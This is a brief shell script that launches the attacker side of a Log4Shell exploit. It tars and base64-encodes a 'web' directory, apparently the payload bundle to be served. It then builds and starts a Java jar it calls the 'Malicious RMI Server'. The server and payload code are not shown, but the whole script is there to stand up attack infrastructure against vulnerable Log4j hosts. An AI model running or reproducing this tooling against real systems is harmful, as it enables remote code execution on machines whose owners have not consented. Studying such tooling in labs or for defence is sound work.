#!/bin/sh
tar -czvf site.tgz web
echo | base64 -w0 > /dev/null 2>&1
if [ $? -eq 0 ]; then
  base64 site.tgz -w0 > site.tgz.base64
else
  base64 -i site.tgz -o site.tgz.base64
fi

./mvnw clean package
if [ $? -eq 0 ]; then
    echo "Staring Malicious RMI Server"
    java -jar target/Log4jshell.rmi.server-0.0.1-SNAPSHOT.jar
else
    echo "Failed to compile Malicious RMI Server"
fi